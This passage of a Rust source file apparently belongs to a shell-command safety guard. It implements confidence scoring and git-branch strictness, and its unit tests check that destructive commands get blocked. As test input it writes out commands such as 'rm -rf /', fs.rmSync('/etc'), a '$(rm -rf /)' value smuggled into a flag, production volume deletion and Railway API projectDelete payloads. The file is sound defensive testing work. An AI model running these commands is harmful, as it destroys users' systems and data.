        return None;
    }

    let mapped_start = range.start.saturating_add(start);
    let mapped_end = range.start.saturating_add(end);
    if mapped_start <= mapped_end && mapped_end <= command.len() {
        Some(MatchSpan {
            start: mapped_start,
            end: mapped_end,
        })
    } else {
        None
    }
}

/// Trait for legacy safe patterns.
pub trait LegacySafePattern {
    /// Check if the pattern matches the command.
    fn is_match(&self, cmd: &str) -> bool;
}

/// Trait for legacy destructive patterns.
pub trait LegacyDestructivePattern {
    /// Check if the pattern matches the command.
    fn is_match(&self, cmd: &str) -> bool;
    /// Find the first match span, if available.
    fn find_span(&self, cmd: &str) -> Option<MatchSpan> {
        let _ = cmd;
        None
    }
    /// Get the reason for blocking.
    fn reason(&self) -> &str;
}

impl LegacySafePattern for crate::packs::SafePattern {
    fn is_match(&self, cmd: &str) -> bool {
        self.regex.is_match(cmd)
    }
}

impl LegacyDestructivePattern for crate::packs::DestructivePattern {
    fn is_match(&self, cmd: &str) -> bool {
        self.regex.is_match(cmd)
    }

    fn find_span(&self, cmd: &str) -> Option<MatchSpan> {
        self.regex
            .find(cmd)
            .map(|(start, end)| MatchSpan { start, end })
    }

    fn reason(&self) -> &str {
        self.reason
    }
}

// =============================================================================
// Confidence Scoring Integration (git_safety_guard-t8x.5)
// =============================================================================

/// Result of applying confidence scoring to a decision.
#[derive(Debug, Clone)]
pub struct ConfidenceResult {
    /// The (potentially adjusted) decision mode.
    pub mode: crate::packs::DecisionMode,
    /// The confidence score (if computed).
    pub score: Option<crate::confidence::ConfidenceScore>,
    /// Whether the mode was downgraded due to low confidence.
    pub downgraded: bool,
}

/// Apply confidence scoring to potentially downgrade a Deny to Warn.
///
/// This function computes a confidence score for the pattern match and
/// optionally downgrades the decision mode if confidence is low.
///
/// # Arguments
///
/// * `command` - The original command being evaluated
/// * `sanitized_command` - The sanitized version (with safe data masked), if available
/// * `result` - The evaluation result (must have `pattern_info` for confidence to apply)
/// * `current_mode` - The decision mode from policy resolution
/// * `config` - Confidence scoring configuration
///
/// # Returns
///
/// A `ConfidenceResult` with the (potentially adjusted) mode and confidence details.
#[must_use]
pub fn apply_confidence_scoring(
    command: &str,
    sanitized_command: Option<&str>,
    result: &EvaluationResult,
    current_mode: crate::packs::DecisionMode,
    config: &crate::config::ConfidenceConfig,
) -> ConfidenceResult {
    // If confidence scoring is disabled, return unchanged mode
    if !config.enabled {
        return ConfidenceResult {
            mode: current_mode,
            score: None,
            downgraded: false,
        };
    }

    // Only apply confidence scoring to Deny decisions that might be downgraded
    if current_mode != crate::packs::DecisionMode::Deny {
        return ConfidenceResult {
            mode: current_mode,
            score: None,
            downgraded: false,
        };
    }

    // Need pattern info to compute confidence
    let Some(info) = &result.pattern_info else {
        return ConfidenceResult {
            mode: current_mode,
            score: None,
            downgraded: false,
        };
    };

    // Protect Critical severity from downgrading (if configured)
    if config.protect_critical
        && info
            .severity
            .is_some_and(|s| s == crate::packs::Severity::Critical)
    {
        return ConfidenceResult {
            mode: current_mode,
            score: None,
            downgraded: false,
        };
    }

    // Get match span for confidence computation
    let Some(span) = &info.matched_span else {
        // No span = can't compute confidence = conservative (keep Deny)
        return ConfidenceResult {
            mode: current_mode,
            score: None,
            downgraded: false,
        };
    };

    // Compute confidence
    let ctx = crate::confidence::ConfidenceContext {
        command,
        sanitized_command,
        match_start: span.start,
        match_end: span.end,
    };
    let score = crate::confidence::compute_match_confidence(&ctx);

    // Check if we should downgrade
    let should_downgrade = score.is_low(config.warn_threshold);
    let new_mode = if should_downgrade {
        crate::packs::DecisionMode::Warn
    } else {
        current_mode
    };

    ConfidenceResult {
        mode: new_mode,
        score: Some(score),
        downgraded: should_downgrade,
    }
}

/// Apply git branch-aware strictness to an evaluation result.
///
/// This function modifies the evaluation result based on the current git branch:
/// - On protected branches (e.g., main, master), stricter settings are applied
/// - On relaxed branches (e.g., feature/*), more permissive settings are applied
/// - The branch_context field is populated with branch information
///
/// # Arguments
/// * `result` - The original evaluation result
/// * `config` - Configuration containing git_awareness settings
/// * `project_path` - Optional path to the project directory (for branch detection)
///
/// # Returns
/// A modified evaluation result with branch context applied.
#[must_use]
pub fn apply_branch_strictness(
    mut result: EvaluationResult,
    config: &Config,
    project_path: Option<&Path>,
) -> EvaluationResult {
    // Early return if git awareness is disabled
    let git_awareness = &config.git_awareness;
    if !git_awareness.enabled {
        return result;
    }

    // Get branch info
    let branch_info = match project_path {
        Some(path) => crate::git::get_branch_info_at_path(path),
        None => crate::git::get_branch_info(),
    };

    // Extract branch name if available
    let is_detached_head = matches!(&branch_info, crate::git::BranchInfo::DetachedHead(_));
    let branch_name = match &branch_info {
        crate::git::BranchInfo::Branch(name) => Some(name.clone()),
        crate::git::BranchInfo::DetachedHead(_) => None,
        crate::git::BranchInfo::NotGitRepo => {
            // Not in a git repo - graceful degradation with default strictness
            tracing::debug!(
                "Not in git repository, using default strictness (git_awareness enabled but no repo detected)"
            );
            // Optionally warn if configured
            if config.git_awareness.warn_if_not_git {
                tracing::warn!(
                    "dcg git_awareness is enabled but not in a git repository - using default strictness"
                );
            }
            return result;
        }
    };

    // Determine branch characteristics
    let is_protected = branch_name
        .as_ref()
        .is_some_and(|name| git_awareness.is_protected_branch(Some(name.as_str())));
    let is_relaxed = branch_name
        .as_ref()
        .is_some_and(|name| git_awareness.is_relaxed_branch(Some(name.as_str())));
    // Detached HEAD (rebase / bisect / checkout-tag) gets its own strictness
    // knob — defaults to All. Without this branch, detached HEAD silently fell
    // back to default_strictness (typically High), missing the very contexts
    // where uncommitted work is most exposed.
    let strictness = if is_detached_head {
        git_awareness.detached_head_strictness
    } else {
        git_awareness.strictness_for_branch(branch_name.as_deref())
    };

    // Determine if the decision should be affected
    let mut affected_decision = false;

    // If the result is Deny and we have severity info, check strictness
    if result.decision == EvaluationDecision::Deny {
        if let Some(ref pattern_info) = result.pattern_info {
            if let Some(severity) = pattern_info.severity {
                // Check if this severity should be blocked at the current strictness
                if !strictness.should_block(severity) {
                    // Convert Deny to Allow because strictness permits it
                    result.decision = EvaluationDecision::Allow;
                    affected_decision = true;
                }
            }
        }
    }

    // Populate branch context
    result.branch_context = Some(BranchContext {
        branch_name,
        is_protected,
        is_relaxed,
        strictness,
        affected_decision,
    });

    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::allowlist::{
        AllowEntry, AllowSelector, AllowlistFile, LoadedAllowlistLayer, RuleId,
    };
    use std::collections::HashMap;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicUsize, Ordering};

    static COUNTER: AtomicUsize = AtomicUsize::new(0);

    fn default_config() -> Config {
        Config::default()
    }

    fn default_compiled_overrides() -> crate::config::CompiledOverrides {
        crate::config::CompiledOverrides::default()
    }

    fn default_allowlists() -> LayeredAllowlist {
        LayeredAllowlist::default()
    }

    fn evaluate_with_pack_ids(command: &str, pack_ids: &[&str]) -> EvaluationResult {
        let enabled_packs: std::collections::HashSet<String> =
            pack_ids.iter().map(|id| (*id).to_string()).collect();
        let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
        let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();
        let heredoc_settings = default_config().heredoc_settings();

        evaluate_command_with_pack_order(
            command,
            enabled_keywords.as_slice(),
            ordered_packs.as_slice(),
            keyword_index.as_ref(),
            &compiled,
            &allowlists,
            &heredoc_settings,
        )
    }

    fn project_allowlists_for_rule(rule: &str, reason: &str) -> LayeredAllowlist {
        let rule = RuleId::parse(rule).expect("rule id must parse");
        LayeredAllowlist {
            layers: vec![LoadedAllowlistLayer {
                layer: AllowlistLayer::Project,
                path: PathBuf::from("project-allowlist.toml"),
                file: AllowlistFile {
                    entries: vec![AllowEntry {
                        selector: AllowSelector::Rule(rule),
                        reason: reason.to_string(),
                        added_by: None,
                        added_at: None,
                        expires_at: None,
                        ttl: None,
                        session: None,
                        session_id: None,
                        context: None,
                        conditions: HashMap::new(),
                        environments: Vec::new(),
                        paths: None,
                        risk_acknowledged: false,
                    }],
                    errors: Vec::new(),
                },
            }],
        }
    }

    #[allow(dead_code)]
    fn project_allowlists_for_pack_wildcard(pack_id: &str, reason: &str) -> LayeredAllowlist {
        LayeredAllowlist {
            layers: vec![LoadedAllowlistLayer {
                layer: AllowlistLayer::Project,
                path: PathBuf::from("project-allowlist.toml"),
                file: AllowlistFile {
                    entries: vec![AllowEntry {
                        selector: AllowSelector::Rule(RuleId {
                            pack_id: pack_id.to_string(),
                            pattern_name: "*".to_string(),
                        }),
                        reason: reason.to_string(),
                        added_by: None,
                        added_at: None,
                        expires_at: None,
                        ttl: None,
                        session: None,
                        session_id: None,
                        context: None,
                        conditions: HashMap::new(),
                        environments: Vec::new(),
                        paths: None,
                        risk_acknowledged: false,
                    }],
                    errors: Vec::new(),
                },
            }],
        }
    }

    #[test]
    fn test_empty_command_allowed() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();
        let result = evaluate_command("", &config, &[], &compiled, &allowlists);
        assert!(result.is_allowed());
        assert!(result.pattern_info.is_none());
    }

    #[test]
    fn test_safe_command_allowed() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();
        let result = evaluate_command("ls -la", &config, &["git", "rm"], &compiled, &allowlists);
        assert!(result.is_allowed());
    }

    #[test]
    fn non_core_safe_segment_does_not_mask_later_destructive_segment() {
        let result = evaluate_with_pack_ids(
            "railway service list && railway volume delete --volume prod-db --yes",
            &["platform.railway"],
        );

        assert!(result.is_denied(), "Railway volume delete must be blocked");
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(info.pattern_name.as_deref(), Some("railway-volume-delete"));
    }

    #[test]
    fn non_core_safe_pipeline_stage_does_not_mask_later_destructive_stage() {
        let result = evaluate_with_pack_ids(
            "railway service list | railway volume delete --volume prod-db --yes",
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway volume delete must be blocked after a safe pipeline stage"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(info.pattern_name.as_deref(), Some("railway-volume-delete"));
    }

    #[test]
    fn non_core_safe_background_command_does_not_mask_later_destructive_command() {
        let result = evaluate_with_pack_ids(
            "railway service list & railway volume delete --volume prod-db --yes",
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway volume delete must be blocked after a safe background command"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(info.pattern_name.as_deref(), Some("railway-volume-delete"));
    }

    #[test]
    fn non_core_safe_segment_does_not_mask_earlier_destructive_segment() {
        let result = evaluate_with_pack_ids(
            "railway volume delete --volume prod-db --yes && railway service list",
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway volume delete must be blocked before a safe segment"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(info.pattern_name.as_deref(), Some("railway-volume-delete"));
    }

    #[test]
    fn non_core_safe_segments_remain_allowed() {
        let result = evaluate_with_pack_ids(
            "railway service list && railway volume list --json",
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "read-only Railway segments should pass"
        );
    }

    #[test]
    fn railway_api_mutations_in_curl_payloads_are_not_hidden_by_data_masking() {
        let result = evaluate_with_pack_ids(
            r#"curl https://backboard.railway.app/graphql/v2 --data-binary '{"query":"mutation($in: VariableUpsertInput!){variableUpsert(input:$in)}","variables":{"in":{"name":"DATABASE_PUBLIC_URL","value":"postgres://prod"}}}'"#,
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway API variableUpsert payload must be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-database-variable-upsert")
        );
    }

    #[test]
    fn railway_api_payload_recheck_detects_windows_curl_exe() {
        for curl_binary in [
            r"C:\Windows\System32\curl.exe",
            r"C:\Windows\System32\CURL.EXE",
        ] {
            let result = evaluate_with_pack_ids(
                &format!(
                    r#"{curl_binary} https://backboard.railway.app/graphql/v2 --data-binary '{{"query":"mutation {{ projectDelete(id:\"p\") }}"}}'"#
                ),
                &["platform.railway"],
            );

            assert!(
                result.is_denied(),
                "Railway API mutation through {curl_binary} must still be blocked"
            );
            let info = result
                .pattern_info
                .expect("denial should include pattern info");
            assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
            assert_eq!(
                info.pattern_name.as_deref(),
                Some("railway-api-project-delete")
            );
        }
    }

    #[test]
    fn railway_api_mutations_with_token_header_are_not_hidden_by_data_masking() {
        let result = evaluate_with_pack_ids(
            r#"curl https://api.example.com/graphql -H "Authorization: Bearer $RAILWAY_API_TOKEN" --data-binary '{"query":"mutation { projectDelete(id:\"p\") }"}'"#,
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway API mutation authenticated by token header must be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-project-delete")
        );
    }

    #[test]
    fn railway_api_mutations_with_project_access_token_are_not_hidden_by_data_masking() {
        let result = evaluate_with_pack_ids(
            r#"curl https://api.example.com/graphql -H "Project-Access-Token: $PROJECT_ACCESS_TOKEN" --data-binary '{"query":"mutation { projectDelete(id:\"p\") }"}'"#,
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway API mutation authenticated by Project-Access-Token must be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-project-delete")
        );
    }

    #[test]
    fn railway_api_payload_recheck_does_not_cross_compound_segments() {
        let result = evaluate_with_pack_ids(
            r#"curl https://backboard.railway.app/graphql/v2 --data-binary '{"query":"query { project(id:\"p\") { id } }"}' && echo projectDelete"#,
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "safe Railway API query plus unrelated documentation text should stay allowed"
        );
    }

    #[test]
    fn railway_api_payload_recheck_does_not_cross_newline_segments() {
        let result = evaluate_with_pack_ids(
            "curl https://backboard.railway.app/graphql/v2 --data-binary '{\"query\":\"query { project(id:\\\"p\\\") { id } }\"}'\necho projectDelete",
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "safe Railway API query plus newline-separated documentation text should stay allowed"
        );
    }

    #[test]
    fn railway_api_payload_recheck_still_blocks_destructive_curl_segment() {
        let result = evaluate_with_pack_ids(
            r#"curl https://backboard.railway.app/graphql/v2 --data-binary '{"query":"query { project(id:\"p\") { id } }"}' && curl https://backboard.railway.app/graphql/v2 --data-binary '{"query":"mutation { projectDelete(id:\"p\") }"}'"#,
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "destructive Railway API mutation in a later curl segment must still be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-project-delete")
        );
    }

    #[test]
    fn railway_api_payload_recheck_handles_shell_line_continuations() {
        let result = evaluate_with_pack_ids(
            "curl https://backboard.railway.app/graphql/v2 \\\n  --data-binary '{\"query\":\"mutation { projectDelete(id:\\\"p\\\") }\"}'",
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway API mutation split with shell line continuation must still be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-project-delete")
        );
    }

    #[test]
    fn railway_api_payload_recheck_handles_multiline_quoted_payloads() {
        let result = evaluate_with_pack_ids(
            "curl https://backboard.railway.app/graphql/v2 --data-binary '{\n\"query\":\"mutation { projectDelete(id:\\\"p\\\") }\"\n}'",
            &["platform.railway"],
        );

        assert!(
            result.is_denied(),
            "Railway API mutation inside a multiline quoted payload must still be blocked"
        );
        let info = result
            .pattern_info
            .expect("denial should include pattern info");
        assert_eq!(info.pack_id.as_deref(), Some("platform.railway"));
        assert_eq!(
            info.pattern_name.as_deref(),
            Some("railway-api-project-delete")
        );
    }

    #[test]
    fn masked_non_curl_documentation_stays_allowed_for_railway_api_terms() {
        let result = evaluate_with_pack_ids(
            r"echo 'projectDelete with RAILWAY_API_TOKEN belongs in docs'",
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "masked documentation text should not activate Railway API inspection"
        );
    }

    #[test]
    fn masked_non_curl_project_token_documentation_stays_allowed() {
        let result = evaluate_with_pack_ids(
            r"echo 'projectDelete with Project-Access-Token belongs in docs'",
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "masked project-token documentation should not activate Railway API inspection"
        );
    }

    #[test]
    fn masked_non_curl_command_name_stays_allowed_for_railway_api_terms() {
        let result = evaluate_with_pack_ids(
            r#"curlgrep -H "Authorization: Bearer $RAILWAY_API_TOKEN" --data-binary '{"query":"mutation { projectDelete(id:\"p\") }"}'"#,
            &["platform.railway"],
        );

        assert!(
            result.is_allowed(),
            "non-curl command names should not activate Railway API inspection"
        );
    }

    #[test]
    fn test_result_helper_methods() {
        let allowed = EvaluationResult::allowed();
        assert!(allowed.is_allowed());
        assert!(!allowed.is_denied());
        assert!(allowed.reason().is_none());
        assert!(allowed.pack_id().is_none());

        let denied = EvaluationResult::denied_by_pack("test.pack", "test reason", None);
        assert!(!denied.is_allowed());
        assert!(denied.is_denied());
        assert_eq!(denied.reason(), Some("test reason"));
        assert_eq!(denied.pack_id(), Some("test.pack"));
    }

    #[test]
    fn test_denied_by_config() {
        let denied = EvaluationResult::denied_by_config("config block".to_string());
        assert!(denied.is_denied());
        assert_eq!(denied.reason(), Some("config block"));
        assert!(denied.pack_id().is_none());
        assert_eq!(
            denied.pattern_info.as_ref().unwrap().source,
            MatchSource::ConfigOverride
        );
    }

    #[test]
    fn test_denied_by_legacy() {
        let denied = EvaluationResult::denied_by_legacy("legacy reason");
        assert!(denied.is_denied());
        assert_eq!(denied.reason(), Some("legacy reason"));
        assert!(denied.pack_id().is_none());
        assert_eq!(
            denied.pattern_info.as_ref().unwrap().source,
            MatchSource::LegacyPattern
        );
    }

    #[test]
    fn test_denied_by_pack_pattern() {
        let denied = EvaluationResult::denied_by_pack_pattern(
            "core.git",
            "reset-hard",
            "test",
            None,
            crate::packs::Severity::Critical,
            &[],
        );
        assert!(denied.is_denied());
        assert_eq!(denied.pack_id(), Some("core.git"));
        assert_eq!(
            denied.pattern_info.as_ref().unwrap().pattern_name,
            Some("reset-hard".to_string())
        );
    }

    #[test]
    fn test_quick_reject_skips_patterns() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();
        let result = evaluate_command(
            "cargo build --release",
            &config,
            &["git", "rm"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_allowed());

        // Even with more keywords
        let result = evaluate_command(
            "npm install",
            &config,
            &["git", "rm", "docker", "kubectl"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_allowed());
    }

    // =========================================================================
    // Heredoc / Inline Script Integration Tests (git_safety_guard-e7m)
    // =========================================================================

    #[test]
    fn heredoc_scan_runs_before_keyword_quick_reject() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // This command would be ALLOWED by keyword quick-reject if we only looked for
        // unrelated pack keywords. The embedded JavaScript is still destructive and must
        // be analyzed and denied.
        let cmd = r#"node -e "require('child_process').execSync('rm -rf /')"""#;
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_denied());

        let info = result.pattern_info.expect("deny must include pattern info");
        assert_eq!(info.source, MatchSource::HeredocAst);
        assert!(
            info.pack_id
                .as_deref()
                .is_some_and(|p| p.starts_with("heredoc."))
        );
    }

    #[test]
    fn heredoc_triggers_inside_safe_string_arguments_do_not_scan_or_block() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // The commit message contains heredoc/inline-script trigger strings and a destructive
        // payload, but it's data-only (safe-string context). We must not treat it as executed.
        let cmd =
            r#"git commit -m "example: node -e \"require('child_process').execSync('rm -rf /')\"""#;
        let result = evaluate_command(cmd, &config, &["git"], &compiled, &allowlists);
        assert!(result.is_allowed());
    }

    #[test]
    fn git_commit_file_stdin_message_with_restore_is_allowed_136() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // `git commit -F -` reads the commit MESSAGE from stdin; a message that
        // merely says "restore"/"reset --hard" is data, never executed, so it
        // must not trip the core.git rules (#136 data-sink half).
        let reset_hard = format!("{}{}", "reset --", "hard");
        let cmd = format!("git commit -F - <<EOF\ndocs: {reset_hard} and restore notes\nEOF");
        let result = evaluate_command(&cmd, &config, &["git"], &compiled, &allowlists);
        assert!(
            result.is_allowed(),
            "commit-message heredoc body must not block: {:?}",
            result.decision
        );
    }

    #[test]
    fn git_restore_after_commit_file_stdin_heredoc_still_blocks_136() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Soundness: only the masked commit-message body is exempt. A real
        // `git restore --worktree` chained after the heredoc terminator must
        // still be denied.
        let cmd = "git commit -F - <<EOF\ndocs: notes\nEOF\ngit restore --worktree .";
        let result = evaluate_command(cmd, &config, &["git"], &compiled, &allowlists);
        assert!(
            result.is_denied(),
            "git restore after the masked heredoc must still block: {:?}",
            result.decision
        );
    }

    #[test]
    fn git_file_stdin_sentinel_does_not_leak_onto_later_bash_heredoc_136() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Soundness: a `git … -F -` on an earlier line must NOT cause a later
        // `bash <<EOF` body (which IS executed) to be masked. The heredoc binds
        // to the command on its own physical line.
        let rmrf = format!("{}{}{}", "rm", " -", "rf");
        let cmd = format!("git commit -F - msg.txt\nbash <<EOF\n{rmrf} /important\nEOF");
        let result = evaluate_command(
            &cmd,
            &config,
            &["git", "bash", "rm"],
            &compiled,
            &allowlists,
        );
        assert!(
            result.is_denied(),
            "bash heredoc body after a git -F - line must still block: {:?}",
            result.decision
        );
    }

    #[test]
    fn bd_notes_with_dangerous_text_is_allowed() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Notes are documentation; dangerous text should not trigger blocking.
        let cmd = "bd create --notes This mentions rm -rf / but is just docs";
        let result = evaluate_command(cmd, &config, &["rm"], &compiled, &allowlists);
        assert!(result.is_allowed());
    }

    #[test]
    fn bd_description_inline_code_is_blocked() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Inline code in a data flag must still be evaluated and blocked.
        let cmd = r#"bd create --description "$(rm -rf /)""#;
        let result = evaluate_command(cmd, &config, &["rm"], &compiled, &allowlists);
        assert!(result.is_denied());
    }

    #[test]
    fn echo_with_dangerous_text_is_allowed() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // echo arguments are data; should not be blocked by keyword matching.
        let cmd = r#"echo "rm -rf /""#;
        let result = evaluate_command(cmd, &config, &["rm"], &compiled, &allowlists);
        assert!(result.is_allowed());
    }

    #[test]
    fn heredoc_commands_are_evaluated_and_block_when_severity_blocks_by_default() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // This command would be ALLOWED by keyword quick-reject if we only looked for unrelated
        // pack keywords. The embedded JavaScript still must be analyzed and denied.
        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_denied());

        let info = result.pattern_info.expect("deny must include pattern info");
        assert_eq!(info.source, MatchSource::HeredocAst);
        assert_eq!(info.pack_id.as_deref(), Some("heredoc.javascript"));
        assert!(
            info.pattern_name
                .as_deref()
                .is_some_and(|p| p.starts_with("fs_rmsync")),
            "expected a fs_rmsync* heredoc rule, got {:?}",
            info.pattern_name
        );
    }

    #[test]
    fn heredoc_commands_with_non_blocking_matches_are_allowed() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Non-catastrophic recursive deletes are currently warn-only; evaluator should not block.
        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('./dist', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_allowed());
        assert!(result.pattern_info.is_none());
    }

    #[test]
    fn heredoc_scanning_can_be_disabled_via_config() {
        let mut config = default_config();
        config.heredoc.enabled = Some(false);
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_allowed());
        assert!(result.pattern_info.is_none());
    }

    #[test]
    fn heredoc_language_filter_can_skip_unwanted_languages() {
        let mut config = default_config();
        config.heredoc.languages = Some(vec!["python".to_string()]);
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_allowed());
        assert!(result.pattern_info.is_none());
    }

    #[test]
    fn heredoc_allowlist_can_override_ast_denial() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists =
            project_allowlists_for_rule("heredoc.javascript:fs_rmsync.catastrophic", "local dev");

        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(result.is_allowed());

        let override_info = result
            .allowlist_override
            .as_ref()
            .expect("allowlist override metadata must be present");
        assert_eq!(override_info.layer, AllowlistLayer::Project);
        assert_eq!(override_info.reason, "local dev");
        assert_eq!(
            override_info.matched.pack_id.as_deref(),
            Some("heredoc.javascript")
        );
        assert_eq!(
            override_info.matched.pattern_name.as_deref(),
            Some("fs_rmsync.catastrophic")
        );
        assert_eq!(override_info.matched.source, MatchSource::HeredocAst);
    }

    #[test]
    fn heredoc_content_allowlist_project_scope_skips_ast_scan() {
        let mut config = default_config();
        let cwd = std::env::current_dir().expect("current_dir must be available");
        let cwd_str = cwd.to_string_lossy().into_owned();

        config.heredoc.allowlist = Some(crate::config::HeredocAllowlistConfig {
            projects: vec![crate::config::ProjectHeredocAllowlist {
                path: cwd_str,
                patterns: vec![crate::config::AllowedHeredocPattern {
                    language: Some("javascript".to_string()),
                    pattern: "fs.rmSync('/etc'".to_string(),
                    reason: "project allowlist".to_string(),
                }],
                content_hashes: vec![],
            }],
            ..Default::default()
        });

        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();

        // This would normally be denied by heredoc AST rules (catastrophic path).
        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(
            result.is_allowed(),
            "project-scoped heredoc content allowlist should skip AST denial"
        );
    }

    #[test]
    fn heredoc_content_allowlist_project_scope_does_not_match_other_projects() {
        let mut config = default_config();

        config.heredoc.allowlist = Some(crate::config::HeredocAllowlistConfig {
            projects: vec![crate::config::ProjectHeredocAllowlist {
                path: "/definitely-not-a-prefix".to_string(),
                patterns: vec![crate::config::AllowedHeredocPattern {
                    language: Some("javascript".to_string()),
                    pattern: "fs.rmSync('/etc'".to_string(),
                    reason: "wrong project".to_string(),
                }],
                content_hashes: vec![],
            }],
            ..Default::default()
        });

        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();

        let cmd =
            "node <<EOF\nconst fs = require('fs');\nfs.rmSync('/etc', { recursive: true });\nEOF";
        let result = evaluate_command(cmd, &config, &["kubectl"], &compiled, &allowlists);
        assert!(
            result.is_denied(),
            "content allowlist should not apply when cwd is outside configured project scope"
        );
    }

    #[test]
    fn heredoc_trigger_strings_inside_safe_string_arguments_do_not_scan_or_block() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();

        // Commit messages can contain heredoc syntax as documentation; these are data-only.
        let cmd = r#"git commit -m "docs: example heredoc: cat <<EOF rm -rf / EOF""#;
        let result = evaluate_command(cmd, &config, &["git"], &compiled, &allowlists);
        assert!(result.is_allowed());
    }

    #[test]
    fn test_evaluation_decision_equality() {
        assert_eq!(EvaluationDecision::Allow, EvaluationDecision::Allow);
        assert_eq!(EvaluationDecision::Deny, EvaluationDecision::Deny);
        assert_ne!(EvaluationDecision::Allow, EvaluationDecision::Deny);
    }

    #[test]
    fn test_match_source_equality() {
        assert_eq!(MatchSource::ConfigOverride, MatchSource::ConfigOverride);
        assert_eq!(MatchSource::LegacyPattern, MatchSource::LegacyPattern);
        assert_eq!(MatchSource::Pack, MatchSource::Pack);
        assert_eq!(MatchSource::HeredocAst, MatchSource::HeredocAst);
        assert_ne!(MatchSource::ConfigOverride, MatchSource::Pack);
    }

    // =========================================================================
    // Allowlist Override Tests (git_safety_guard-1gt.2.2)
    // =========================================================================

